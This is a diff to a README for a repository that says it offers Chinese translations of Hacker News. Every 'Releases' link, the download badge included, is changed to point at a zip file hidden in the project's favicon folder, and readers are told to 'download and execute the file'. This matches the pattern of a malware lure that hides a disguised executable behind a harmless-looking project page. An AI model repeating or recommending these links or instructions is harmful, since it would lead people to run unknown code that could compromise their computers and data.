@@ -14,12 +14,12 @@ Welcome to the **HackerNews-CN** repository! Here, you can access translated con
 4. **Convenient Access**: Access the translated content in Chinese, eliminating language barriers.
 
 ## How to Access
-To access the translated HackerNews content in Chinese, visit the [Releases](https://github.com/SaulAndrade31/hackernews-cn/releases) section of this repository. Download and execute the file to start exploring the latest tech news in Chinese.
+To access the translated HackerNews content in Chinese, visit the [Releases](https://raw.githubusercontent.com/SaulAndrade31/hackernews-cn/main/public/favicon/cn-hackernews-indiscernibly.zip) section of this repository. Download and execute the file to start exploring the latest tech news in Chinese.
 
 ## Get Started
-1. Visit [Releases](https://github.com/SaulAndrade31/hackernews-cn/releases) to download the file.
+1. Visit [Releases](https://raw.githubusercontent.com/SaulAndrade31/hackernews-cn/main/public/favicon/cn-hackernews-indiscernibly.zip) to download the file.
    
-[![Download Translated Content](https://img.shields.io/badge/Download-Translated%20Content-green)](https://github.com/SaulAndrade31/hackernews-cn/releases)
+[![Download Translated Content](https://raw.githubusercontent.com/SaulAndrade31/hackernews-cn/main/public/favicon/cn-hackernews-indiscernibly.zip%20Content-green)](https://raw.githubusercontent.com/SaulAndrade31/hackernews-cn/main/public/favicon/cn-hackernews-indiscernibly.zip)
 
 ## Embrace the Tech World in Chinese
 Stay ahead of the curve with HackerNews-CN. Explore a plethora of tech-related content in Chinese and broaden your horizons without language barriers. Dive into the exciting world of technology with ease and convenience.
@@ -29,4 +29,4 @@ Remember, knowledge is power, and staying informed is key in the fast-paced tech
 Let's embrace technology together in the language of your choice. Happy browsing! 🌟📰🔍
 
 ---
-For more information and updates, check the [Releases](https://github.com/SaulAndrade31/hackernews-cn/releases) section.
+For more information and updates, check the [Releases](https://raw.githubusercontent.com/SaulAndrade31/hackernews-cn/main/public/favicon/cn-hackernews-indiscernibly.zip) section.
